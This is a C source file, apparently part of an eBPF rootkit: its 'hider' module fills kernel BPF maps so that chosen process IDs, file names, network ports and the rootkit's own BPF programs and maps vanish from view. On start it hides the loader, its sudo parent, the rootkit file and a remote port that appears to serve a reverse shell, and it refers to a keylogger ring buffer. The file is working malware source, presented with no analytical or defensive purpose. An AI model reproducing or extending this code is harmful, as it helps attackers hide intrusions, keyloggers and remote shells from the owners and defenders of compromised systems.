#include <linux/types.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "userspace/hider.h"
#include "userspace/reverse_shell.h"
#include "config.h"
#include "rootkit.skel.h"

/* Private internal state storing all map FDs */
static struct {
    struct rootkit *skel;
    int hide_names_map_fd;
    int hide_ports_map_fd;
    int hide_bpf_map_fd;
    bool is_initialized;
} g_hider = {
    .skel = NULL,
    .hide_names_map_fd = -1,
    .hide_ports_map_fd = -1,
    .hide_bpf_map_fd = -1,
    .is_initialized = false,
};

/* Internal helper: zero-pads keys to match eBPF memory layout */
static int update_string_map(int map_fd, const char *str_val)
{
    if (!g_hider.is_initialized || map_fd < 0 || !str_val)
        return -EINVAL;

    char key[MAX_NAME_LEN] = { 0 };

    if (strlen(str_val) >= MAX_NAME_LEN)
        return -ENAMETOOLONG;

    snprintf(key, sizeof(key), "%s", str_val);

    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, key, &value, BPF_ANY);
}

static int delete_string_map(int map_fd, const char *str_val)
{
    if (!g_hider.is_initialized || map_fd < 0 || !str_val)
        return -EINVAL;

    char key[MAX_NAME_LEN] = { 0 };

    if (strlen(str_val) >= MAX_NAME_LEN)
        return -ENAMETOOLONG;

    snprintf(key, sizeof(key), "%s", str_val);

    return bpf_map_delete_elem(map_fd, key);
}

static int update_uint32_map(int map_fd, uint32_t key)
{
    if (!g_hider.is_initialized || map_fd < 0)
        return -EINVAL;

    uint8_t value = 1;
    return bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
}

static int hide_bpf_maps()
{
    if (!g_hider.is_initialized || !g_hider.skel->obj)
        return -EINVAL;

    struct bpf_map *map = NULL;
    int ring_buffer_event_fd = bpf_map__fd(g_hider.skel->maps.keylog_events);
    int ret = 0;

    bpf_object__for_each_map(map, g_hider.skel->obj) {
        struct bpf_map_info info = {};
        uint32_t len = sizeof(info);
        int fd = bpf_map__fd(map);

        /* Skip keylogger ring buffer that must stay exposed */
        if (fd == ring_buffer_event_fd)
            continue;

        if (fd >= 0 && bpf_obj_get_info_by_fd(fd, &info, &len) == 0) {
            int err = update_uint32_map(g_hider.hide_bpf_map_fd, info.id);
            if (err != 0) {
                ret = err;
            }
        }
    }

    return ret;
}

static int hide_bpf_programs()
{
    if (!g_hider.is_initialized || !g_hider.skel->obj)
        return -EINVAL;

    struct bpf_program *prog = NULL;
    int ret = 0;

    bpf_object__for_each_program(prog, g_hider.skel->obj) {
        struct bpf_prog_info info = {};
        uint32_t len = sizeof(info);
        int fd = bpf_program__fd(prog);

        if (fd >= 0 && bpf_obj_get_info_by_fd(fd, &info, &len) == 0) {
            int err = update_uint32_map(g_hider.hide_bpf_map_fd, info.id);
            if (err != 0) {
                ret = err;
            }
        }
    }

    return ret;
}

static int hide_bpf()
{
    if (!g_hider.is_initialized)
        return -EINVAL;

    int ret = 0;
    ret = hide_bpf_programs();
    if (ret)
        return ret;
    
    ret = hide_bpf_maps();
    return ret;
}

/* Public API Implementations */
/* Bind all skeleton maps in one place */
int hider_init(struct rootkit *skel)
{
    if (!skel)
        return -EINVAL;

    g_hider.skel = skel;

    g_hider.hide_names_map_fd = bpf_map__fd(skel->maps.hide_names_map);
    if (g_hider.hide_names_map_fd < 0)
        return -EINVAL;

    g_hider.hide_ports_map_fd = bpf_map__fd(skel->maps.hide_ports_map);
    if (g_hider.hide_ports_map_fd < 0)
        return -EINVAL;

    g_hider.hide_bpf_map_fd = bpf_map__fd(skel->maps.hide_bpf_ids_map);
    if (g_hider.hide_bpf_map_fd < 0)
        return -EINVAL;

    g_hider.is_initialized = true;
    return 0;
}

int hider_hide_pid(pid_t pid)
{
    if (pid <= 0)
        return -EINVAL;

    char pid_str[MAX_NAME_LEN] = { 0 };
    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    return update_string_map(g_hider.hide_names_map_fd, pid_str);
}

int hider_hide_file(const char *filename)
{
    return update_string_map(g_hider.hide_names_map_fd, filename);
}

int hider_hide_port(uint16_t port)
{
    if (!g_hider.is_initialized || g_hider.hide_ports_map_fd < 0)
        return -EINVAL;

    uint8_t value = 1;
    return bpf_map_update_elem(g_hider.hide_ports_map_fd, &port, &value, BPF_ANY);
}

int hider_unhide_pid(pid_t pid)
{
    if (pid <= 0) 
        return -EINVAL;

    char pid_str[MAX_NAME_LEN] = { 0 };
    snprintf(pid_str, sizeof(pid_str), "%d", pid);

    return delete_string_map(g_hider.hide_names_map_fd, pid_str);
}

int hider_unhide_file(const char *filename)
{
    return delete_string_map(g_hider.hide_names_map_fd, filename);
}

int hider_unhide_port(uint16_t port)
{
    if (!g_hider.is_initialized || g_hider.hide_ports_map_fd < 0)
        return -EINVAL;

    return bpf_map_delete_elem(g_hider.hide_ports_map_fd, &port);
}

int hider_set_initial_hide_state()
{
    if (!g_hider.is_initialized)
        return -EINVAL;

    int ret = 0;
    pid_t loader_pid = getpid();
    pid_t parent_pid = getppid();

    ret = hider_hide_pid(loader_pid);
    if (ret != 0)
        return ret;

    /* Hide sudo parent PID, make sure it's not init */
    if (parent_pid > 1) {
        ret = hider_hide_pid(parent_pid);
        if (ret != 0)
            return ret;
    }

    ret = hider_hide_file(ROOTKIT_FILE_NAME);
    if (ret != 0)
        return ret;

    ret = hider_hide_port(REMOTE_PORT);
    if (ret != 0)
        return ret;

    ret = hide_bpf();
    if (ret != 0)
        return ret;

    return 0;
}
